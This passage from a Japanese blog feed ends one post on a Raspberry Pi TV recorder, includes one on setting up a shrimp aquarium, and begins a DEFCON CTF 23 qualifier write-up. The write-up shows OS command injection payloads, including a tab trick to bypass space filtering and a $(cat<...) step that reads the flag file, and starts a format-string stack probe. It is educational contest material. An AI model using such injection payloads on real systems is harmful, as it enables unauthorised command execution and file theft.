<p>番組検索ができるページがSearchページです。
今の所、番組タイトルのみを対象としており、かつ大文字小文字・全角半角を厳しく判定しているので、すこしでも違うとヒットしません。
バージョン1.0.0では、検索してもできることは番組情報の表示だけなので、録画予約の設定や、
検索ワードに関して改良の余地アリなので今後改良していきたいです。</p>

<h2>オマケ</h2>

<p><img src="http://mzyy94.com/blog/resources/images/2015/08/08/pvr-information.png" alt="pvr information" /></p>

<p>Settings -> System info -> PVR Serviceからチャンネル数や録画済み番組数、録画予約数が確認できます。</p>

<h1>まとめ</h1>

<p>Raspberry Pi2でもAndroid TV（一手間必要）でも快適に地デジ見れるようになったので、<a href="http://japanese.engadget.com/2015/08/06/7-5000-50-4k-q-display-4k50-upq/">チューナーなし50インチ4Kディスプレイ</a>が欲しくなってしまった。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[エビ水槽を新しくした]]></title>
    <link href="http://mzyy94.com/blog/2015/06/21/ebi-new-watertank/"/>
    <updated>2015-06-21T16:35:31+09:00</updated>
    <id>http://mzyy94.com/blog/2015/06/21/ebi-new-watertank</id>
    <content type="html"><![CDATA[<p>えびを飼い始めて4ヶ月が過ぎました。
ゴールデンウィークにスカイツリーに行った時、偶然にもまた小さいえび(ホロホロシュリンプ，ピクシーシュリンプ，)を見つけてしまい、一目惚れした結果、新しくえびを4匹追加しました。</p>

<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


<blockquote class="twitter-tweet" lang="ja"><p lang="ja" dir="ltr">【速報】エビ購入 <a href="http://t.co/7XvtGubiKJ">pic.twitter.com/7XvtGubiKJ</a></p>&mdash; エビライブ配信休止中 (@mzyy94) <a href="https://twitter.com/mzyy94/status/595125289643937792">2015, 5月 4</a></blockquote>


<p>追加に伴い、今までの小さなポットは狭いと感じ、銀座の東急ハンズで大きなポットとガラス砂利を購入し、2月に飼い始めたエビとともに移し変えました。
しかし悲しいことに、購入時の瓶から移し替える際に砂に潜ったエビが体調不良をおこし、購入の翌日の晩に亡くなってしまいました。
他のエビは元気で、現在7匹ワイワイと過ごしております。</p>

<blockquote class="twitter-tweet" lang="ja"><p lang="ja" dir="ltr">一悶着あったけど無事全員の引越し完了！ <a href="http://t.co/jLvciTSJGs">pic.twitter.com/jLvciTSJGs</a></p>&mdash; エビライブ配信休止中 (@mzyy94) <a href="https://twitter.com/mzyy94/status/595228119708999680">2015, 5月 4</a></blockquote>




<!-- more -->


<p>季節は変わり、初夏となりました。
冬の間は購入時の瓶を<a href="https://twitter.com/mzyy94/status/566981294739820547">サーバーの中に入れたり</a>USB接続の発熱体を水槽に貼り付けるなどして適温(24℃前後)を維持してきましたが、今は暑くなり、冷却が必要となりました。
水槽の一般的な冷却方法は、ファンを当てることによる気化熱による熱量の移動です。ただ、この水槽内は汽水であるため、安易にファンでの冷却を行うと塩分濃度が変わってしまいます。
そこで導入したのがこちらの水槽自動水足し機。</p>

<blockquote class="twitter-tweet" lang="ja"><p lang="ja" dir="ltr">えび用給水機設置 <a href="http://t.co/3QSjCYV2Tc">pic.twitter.com/3QSjCYV2Tc</a></p>&mdash; エビライブ配信休止中 (@mzyy94) <a href="https://twitter.com/mzyy94/status/610766091095183360">2015, 6月 16</a></blockquote>




<iframe src="http://rcm-fe.amazon-adsystem.com/e/cm?lt1=_blank&bc1=000000&IS2=1&bg1=FFFFFF&fc1=000000&lc1=0000FF&t=mzyy-22&o=9&p=8&l=as4&m=amazon&f=ifr&ref=ss_til&asins=B00BJEB67C" style="width:120px;height:240px;" scrolling="no" marginwidth="0" marginheight="0" frameborder="0"></iframe>


<p>水量が減ると水圧によって自動でペットボトルから液体が水槽へと流れる仕組みとなっています。
このペットボトルにRO水を入れてファンを回し、冷却をすることにしました。</p>

<p>しかし、自動水足し機を購入する際に懸念していた事項ですが、水足し機の固定具は直角な水槽の淵向けであり、円形の淵に固定具がフィットしないのです。
そのため、暫定的にこのように隣のディスプレイに寄りかかるようにして設置していました。
それでもペットボトルは不安定で、<a href="https://twitter.com/mzyy94/status/602713494949994498">この前のように地震が起きてしまったら</a>水槽ごと倒れる危険だってあります。
丸い形の水槽が好きだったため、今まで丸いポットで飼っていましたが、ついに四角い水槽を買う必要に迫られてしまいました。</p>

<p>買いました。四角い水槽。</p>

<h1>買った物リスト</h1>

<p>観賞魚や鑑賞エビの通信販売大手であるCharmさんで2-3時間かけて慎重に選び、水槽とその他グッズを購入しました。</p>

<h2>水槽</h2>

<p><a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.65897&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D65897"><img src="http://www.shopping-charm.jp/pic/658/65897-1.jpg" alt="グラステリア２５０　（２５×１７×２１）　２５ｃｍ水槽（単体）" /></a></p>

<ul>
<li>Charm: <a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.65897&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D65897">グラステリア２５０　（２５×１７×２１）　２５ｃｍ水槽（単体）</a></li>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B004HCLJWK/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B004HCLJWK&amp;linkCode=as2&amp;tag=mzyy-22">ジェックス グラステリア 250</a></li>
</ul>


<p>水槽はサイズを迷いましたが25cm水槽を購入しました。小さなエビにとっては15cm水槽や20cm水槽でも十分広いだろうと思いましたが、万一汽水が蒸発した時の塩分濃度変化が少ないだろうと踏み、少し大き目を購入しました。</p>

<h2>砂利</h2>

<p><a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.161847&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D161847"><img src="http://www.shopping-charm.jp/pic/161/161847-1.jpg" alt="アクアクリスタルサンド　ブルー　５００ｇ" /></a></p>

<ul>
<li>Charm: <a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.161847&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D161847">アクアクリスタルサンド　ブルー　５００ｇ</a></li>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B00U5OY94O/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B00U5OY94O&amp;linkCode=as2&amp;tag=mzyy-22">アクアクリスタルサンド　ブルー　５００ｇ</a></li>
</ul>


<p>槽が広くなるため、今までの砂利では足りないと感じたため、同じ色の砂利を購入しました。</p>

<h2>フィルター&amp;ポンプ</h2>

<p><a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.170800&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D170800"><img src="http://www.shopping-charm.jp/pic/170/170800-1.jpg" alt="水作　ボトムフィルター　ミニ（ハーフプレート２枚入り）底面フィルター" /></a></p>

<ul>
<li>Charm: <a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.170800&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D170800">水作　ボトムフィルター　ミニ（ハーフプレート２枚入り）底面フィルター</a></li>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B00XA2NGP6/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B00XA2NGP6&amp;linkCode=as2&amp;tag=mzyy-22">水作 水作ボトムフィルター ミニ</a></li>
</ul>


<p><a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.14310&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D14310"><img src="http://www.shopping-charm.jp/pic/143/14310-1.jpg" alt="ノンノイズ　Ｓ－１００　～３０ｃｍ水槽用エアーポンプ" /></a></p>

<ul>
<li>Charm: <a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.14310&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D14310">ノンノイズ　Ｓ－１００　～３０ｃｍ水槽用エアーポンプ</a></li>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B0050NIM7U/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B0050NIM7U&amp;linkCode=as2&amp;tag=mzyy-22">ノンノイズS-100</a></li>
</ul>


<p>一般的な形の水槽に変わったため、水質変化維持のためのフィルターをつける余地が出てきました。
フィルターにはいくつか種類があり、壁掛け式や底面式などがあります。
壁掛け式では水中から水を吸い込み、フィルターで濾して水槽内へ排出する仕組み上、小さくえびが吸い込まれてしまう危険があります。
対して底面式では、砂利の下にある水を吸い上げフィルターで濾すため、その危険は格段に低くなります。
迷うことなく後者の底面フィルター式を購入しました。
ポンプは水をフィルター内に循環させるために用います。</p>

<h2>水草</h2>

<p>せっかく大きな水槽になるのに装飾品がそのままでは少し物寂しいと思ったので、水草をいくつか追加しました。</p>

<h3>ウィローモス</h3>

<p><a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.12828&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D12828"><img src="http://www.shopping-charm.jp/pic/128/12828-1.jpg" alt="（水草）ウィローモス（無農薬）（１パック）" /></a></p>

<ul>
<li>Charm: <a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.12828&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D12828">（水草）ウィローモス（無農薬）（１パック）</a></li>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B00UF4A3QW/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B00UF4A3QW&amp;linkCode=as2&amp;tag=mzyy-22">（水草）ウィローモス（無農薬）（１パック）　北海道航空便要保温</a></li>
</ul>


<p>これは前の記事にも書きましたが、汽水でも多分育つ藻です。
えびの足場となったり食べ物になったりします。</p>

<h3>アヌビアス・ナナ</h3>

<p><a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.431211&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D431211"><img src="http://www.shopping-charm.jp/pic/431/431211-1.jpg" alt="（水草）組織培養　ライフマルチ　アヌビアス　ナナ（無農薬）（１個）" /></a></p>

<ul>
<li>Charm: <a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.431211&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D431211">（水草）組織培養　ライフマルチ　アヌビアス　ナナ（無農薬）（１個）</a></li>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B00UF485KI/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B00UF485KI&amp;linkCode=as2&amp;tag=mzyy-22">（水草）組織培養　ライフマルチ　アヌビアス　ナナ（無農薬）（１個）　北海道航空便要保温</a></li>
</ul>


<p>他に汽水でも育つかもしれない水草はないかと調べていたところ、<a href="http://eightmillion.net/255/">汽水域で育つ(塩分に強い)水草 超水草図鑑エイトミリオン(アクアリウム・水草の育て方・水草水槽レイアウト・水草の増やし方)</a>にて紹介されている水草の中で見た目が気に入ったものがこれです。
主に色目のために入れます。</p>

<h2>汽水</h2>

<p><a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.503740&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D503740"><img src="http://www.shopping-charm.jp/pic/503/503740-1.jpg" alt="（海水）足し水くん　汽水　２．８Ｌ" /></a></p>

<ul>
<li>Charm: <a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.503740&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D503740">（海水）足し水くん　汽水　２．８Ｌ</a></li>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B00UF458AS/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B00UF458AS&amp;linkCode=as2&amp;tag=mzyy-22">（海水）足し水くん　天然海水「クリオネ水」（海洋深層水）　２．８リットル</a></li>
</ul>


<p>水槽がいままでのものより大きくなるため追加の水が必要ですが、汽水であるため、そのままの水道水は使えません。
汽水としてあらかじめ濃度が調節されているものが売られていたので、これを5.6リットル購入しました。</p>

<h1>引越し完了</h1>

<h2>Before</h2>

<blockquote class="twitter-tweet" lang="ja"><p lang="ja" dir="ltr">2015年6月16日現在のえび飼育装置全貌 <a href="http://t.co/yKWdfrhbUH">pic.twitter.com/yKWdfrhbUH</a></p>&mdash; エビライブ配信休止中 (@mzyy94) <a href="https://twitter.com/mzyy94/status/610789625393647616">2015, 6月 16</a></blockquote>


<h2>After</h2>

<blockquote class="twitter-tweet" lang="ja"><p lang="ja" dir="ltr">2015年6月20日現在のえび飼育装置全貌 <a href="http://t.co/oCNNERkua0">pic.twitter.com/oCNNERkua0</a></p>&mdash; エビライブ配信休止中 (@mzyy94) <a href="https://twitter.com/mzyy94/status/612252163058745344">2015, 6月 20</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p lang="ja" dir="ltr">引っ越し完了！ <a href="http://t.co/ms1wCAqxyz">pic.twitter.com/ms1wCAqxyz</a></p>&mdash; エビライブ配信休止中 (@mzyy94) <a href="https://twitter.com/mzyy94/status/612251688510976000">2015, 6月 20</a></blockquote>


<h1>まとめ</h1>

<p>えびかわいい</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DEFCON CTF 23予選 Write-up (解説付き(すこし))]]></title>
    <link href="http://mzyy94.com/blog/2015/05/18/defcon-qual-23-writeup/"/>
    <updated>2015-05-18T23:45:04+09:00</updated>
    <id>http://mzyy94.com/blog/2015/05/18/defcon-qual-23-writeup</id>
    <content type="html"><![CDATA[<p>今年のDEFCON CTFの予選が5月16日午前9時から48時間開催されていました。今回はチーム********としての参加ではなく、Team Enuに派遣される形で参加してきました。</p>

<p>今年は、比較的やさしいBaby&#8217;s First問題とPwn問題、リバースエンジニアリングのジャンルに属する問題が各数問あり、加えてWebとCoding Challengeが1問ずつありました。
複数ある問題の中でFlagをsubmitしたのは1問だけですが、いくつか正解までたどり着くところまで解けたのでWrite-upを記します。</p>

<!-- more -->


<h1>Babycmd</h1>

<h2>問題文</h2>

<pre><code>babycmd_3ad28b10e8ab283d7df81795075f600b.quals.shallweplayaga.me:15491

[Download](http://downloads.notmalware.ru/babycmd_3ad28b10e8ab283d7df81795075f600b)
</code></pre>

<h2>問題</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to another Baby's First Challenge!
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>: </span></code></pre></td></tr></table></div></figure>


<p>pingとhostとdigコマンドが実行できるアプリケーションにアクセスして、どうにかしてflagを獲得する問題。
逆アセンブルした結果、<em>コマンド[スペース]引数</em>として標準入力から渡すと、コマンドが( dig | ping | host | exit | help )かどうかで分岐し、引数が適切であるか、またIPアドレスかどうかをチェックし、コマンドをpopen経由で実行しているものでした。
<code>strings</code>コマンドと<code>grep</code>で<em>%s</em>がある記述を探したところ、各コマンドは引数がIPアドレスなのかそれ以外かで分岐し、</p>

<table>
<thead>
<tr>
<th>タイプ </th>
<th> 実行コマンド</th>
</tr>
</thead>
<tbody>
<tr>
<td>dig (IPアドレス）</td>
<td> <code>dig -x 引数</code></td>
</tr>
<tr>
<td>dig（文字列）</td>
<td><code>dig '引数'</code></td>
</tr>
<tr>
<td>ping（IPアドレスのみ）</td>
<td><code>ping -c 3 -W 3 引数</code></td>
</tr>
<tr>
<td>host（IPアドレス）</td>
<td><code>host 引数</code></td>
</tr>
<tr>
<td>host（文字列）</td>
<td><code>host "引数"</code></td>
</tr>
</tbody>
</table>


<p>としてpopenで実行されるようになっていました。</p>

<p>適当にPublic DNS宛にPingを送ってみると以下のような表示になりました。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to another Baby's First Challenge!
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>: ping 8.8.8.8
</span><span class='line'>PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
</span><span class='line'>64 bytes from 8.8.8.8: icmp_req=1 ttl=128 time=9.51 ms
</span><span class='line'>64 bytes from 8.8.8.8: icmp_req=2 ttl=128 time=9.53 ms
</span><span class='line'>64 bytes from 8.8.8.8: icmp_req=3 ttl=128 time=9.95 ms
</span><span class='line'>
</span><span class='line'>--- 8.8.8.8 ping statistics ---
</span><span class='line'>3 packets transmitted, 3 received, 0 0x7fffd2999630acket loss, time 2005ms
</span><span class='line'>rtt min/avg/max/mdev = 9.515/9.667/9.956/0.219 ms
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>:</span></code></pre></td></tr></table></div></figure>


<p>pingの出力結果に含まれる<strong>% Packet</strong>が、フォーマット文字列の<em>%p</em>として解釈され、アドレスが表示されていることがわかりました。format string attack(後述)として攻められるような感じがしましたが、他の人が取り組んでいるようなので違う方法でアプローチをしていくことにしました。</p>

<p>digとhostに文字列を渡した時の括りがそれぞれ違うことに注目しました。digではシングルクオートで、hostではダブルクオートでくくって引数を渡しています。
シェル上では、ダブルクオートの文字列の中で変数を展開できます。<code>echo "$SHELL"</code>とすると<em>/bin/bash</em>と出力されるのがいい例です。今回の問題の場合は、<code>host $SHELL</code>として標準入力から渡すと、<code>host "/bin/bash"</code>として実行されると考えられます。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to another Baby's First Challenge!
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>: host $PWD
</span><span class='line'>Invalid hostname.
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>:</span></code></pre></td></tr></table></div></figure>


<p>しかしながら、試しに<code>host $PWD</code>として打ってみたところ、引数チェックで引っかかり、<em>popen</em>で実行されませんでした。</p>

<p>逆コンパイルの結果、引数チェックでは最初と最後の文字が数字もしくはアルファベットでない場合にエラーとして実行させないようにしていることがわかったので、<code>host A${PWD}A</code>として実行してみました。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to another Baby's First Challenge!
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>: host $PWD
</span><span class='line'>Invalid hostname.
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>: host A${PWD}A
</span><span class='line'>Host A/A not found: 3(NXDOMAIN)
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>:</span></code></pre></td></tr></table></div></figure>


<p>変数展開されていることが確認できました。/ディレクトリがカレントディレクトリのようです。</p>

<h2>攻撃手法：OSコマンド インジェクション</h2>

<p>これができることがわかると、次に挑戦したくなるのは変数中のコマンド展開によるOSコマンド インジェクションです。
コマンド展開とは、ダブルクオート中に変数を展開するのと同じ要領で、<em>$(コマンド)</em>としてコマンドを実行し、文字列中にコマンドの出力を展開するものです。例として、<code>echo "$(uname)"</code>とすると<em>Linux</em>と返ってきます。これを用いて実行中のユーザーを確認します。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to another Baby's First Challenge!
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>: host A$(whoami)A
</span><span class='line'>Host AbabycmdA not found: 3(NXDOMAIN)
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>:</span></code></pre></td></tr></table></div></figure>


<p>babycmdユーザーとして実行されていることがわかりました。
そこで、ホームディレクトリ内のファイル一覧を取得してみることにしました。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to another Baby's First Challenge!
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>: host A$(ls /home/babycmd)A
</span><span class='line'>sh: 1: ls/home/babycmd: not found
</span><span class='line'>Host AA not found: 3(NXDOMAIN)
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>:</span></code></pre></td></tr></table></div></figure>


<p>引数に渡される文字列に含まれるスペースが削られるようです。タブで代用してみました。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to another Baby's First Challenge!
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>: host A$(ls    /home/babycmd)A
</span><span class='line'>Host Ababycmd
</span><span class='line'>flagA not found: 3(NXDOMAIN)
</span><span class='line'>Commands: ping, dig, host, exit</span></code></pre></td></tr></table></div></figure>


<p>ホームディレクトリにbabycmdとflagというファイルがあることがわかりました。
catのリダイレクトでflagを抜いてしまいます。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to another Baby's First Challenge!
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>:  host A$(cat&lt;/home/babycmd/flag)A
</span><span class='line'>Host AThe flag is: Pretty easy eh!!~ Now let's try something hArd3r, shallwe??A not found: 3(NXDOMAIN)
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>:</span></code></pre></td></tr></table></div></figure>


<p>FLAG:<code>Pretty easy eh!!~ Now let's try something hArd3r, shallwe??</code></p>

<p>OSコマンドインジェクションに関連する脆弱性対策をIPAが公開してくれているので、CTFのためにも自衛のためにも一度目を通しておくことをお勧めします。</p>

<p><a href="http://www.ipa.go.jp/security/awareness/vendor/programmingv2/contents/c909.html">IPA ISEC　セキュア・プログラミング講座：C/C++言語編　第10章 著名な脆弱性対策：コマンド注入攻撃対策</a></p>

<h1>Babyecho</h1>

<h2>問題文</h2>

<pre><code>babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me:3232

[Download](http://downloads.notmalware.ru/babyecho_eb11fdf6e40236b1a37b7974c53b6c3d)
</code></pre>

<h2>問題</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Reading 13 bytes</span></code></pre></td></tr></table></div></figure>


<p>標準入力で待ち受けしているので、文字列を送ると標準出力に<del>そのまま</del><em>的確に</em>返してくれるプログラムにアクセスしてflagを得る問題です。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Reading 13 bytes
</span><span class='line'>%p.%p.%p.%p
</span><span class='line'>0xd.0xa.(nil).0xd
</span><span class='line'>Reading 13 bytes
</span><span class='line'>0123456789abcdef
</span><span class='line'>0123456789ab
</span><span class='line'>Reading 13 bytes
</span><span class='line'>def
</span><span class='line'>Reading 13 bytes</span></code></pre></td></tr></table></div></figure>


<p>フォーマット文字列が使えて、12文字を越えると次の入力として処理されるようです。</p>

<p>バイナリを<code>strings</code>コマンドでみてみると、入力待ちの直前に表示されている<em>Reading 13 bytes</em>の13という数字は可変であることがわかります。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ strings ./babyecho_eb11fdf6e40236b1a37b7974c53b6c3d | grep Reading
</span><span class='line'>Reading %d bytes</span></code></pre></td></tr></table></div></figure>


<p>フォーマット文字列を使ってスタックの中身をもうすこしみてみます。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Reading 13 bytes
</span><span class='line'>AAAA%5$p
</span><span class='line'>AAAA0xffea839c
</span><span class='line'>Reading 13 bytes
</span><span class='line'>AAAA%6$p
</span><span class='line'>AAAA(nil)
</span><span class='line'>Reading 13 bytes
</span><span class='line'>AAAA%7$p
</span><span class='line'>AAAA0x41414141
</span><span class='line'>Reading 13 bytes</span></code></pre></td></tr></table></div></figure>


<p><em>AAAA%7$p</em>を渡した状態の時、以下のようにスタック(esp)に積まれていることがわかります。</p>

<p><svg width="300" height="400" style="background-color: #fff">
<g class="block" transform="translate(80,20)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x????????</tspan>
</text>
</g>
<g class="block" transform="translate(80,60)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000d</tspan>
</text>
</g>
<g class="block" transform="translate(80,100)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000a</tspan>
</text>
</g>
<g class="block" transform="translate(80,140)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
</text>
</g>
<g class="block" transform="translate(80,180)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000d</tspan>
</text>
</g>
<g class="block" transform="translate(80,220)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0xffea839c</tspan>
</text>
</g>
<g class="block" transform="translate(80,260)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
</text>
</g>
<g class="block" transform="translate(80,300)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x41414141</tspan>
</text>
</g>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,20)">esp</text>
